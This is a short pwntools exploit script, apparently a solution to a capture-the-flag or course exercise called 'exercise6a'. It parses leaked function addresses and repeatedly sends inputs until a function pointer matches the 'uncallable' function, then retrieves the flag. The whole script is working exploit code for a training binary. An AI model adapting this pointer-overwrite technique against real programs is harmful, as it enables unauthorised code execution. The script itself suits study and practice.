#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Parse the addresses from the received bytes
def get_addresses(process):
	process.recvuntil(b'good_bye')
	goodbye = int(process.readline(), 0)
	process.recvuntil(b'uncallable')
	uncallable = int(process.readline(), 0)
	process.recvuntil(b'enter:\n')
	
	return goodbye, uncallable
	
r = start()

init_addr, _ = get_addresses(r)
r.sendline(b'A')
good_bye = init_addr

# Read until we start changing good_bye address
while init_addr == good_bye:
	good_bye, _ = get_addresses(r)
    
	r.sendline(b'A')

# Read until good_bye address becomes equal to uncallable address
while True:
	good_bye, uncallable = get_addresses(r)
	
	if good_bye == uncallable:
		break
	
	r.sendline(b'd')

# Retrieve flag
r.sendline(b'q')
out = r.recv()
print(out)

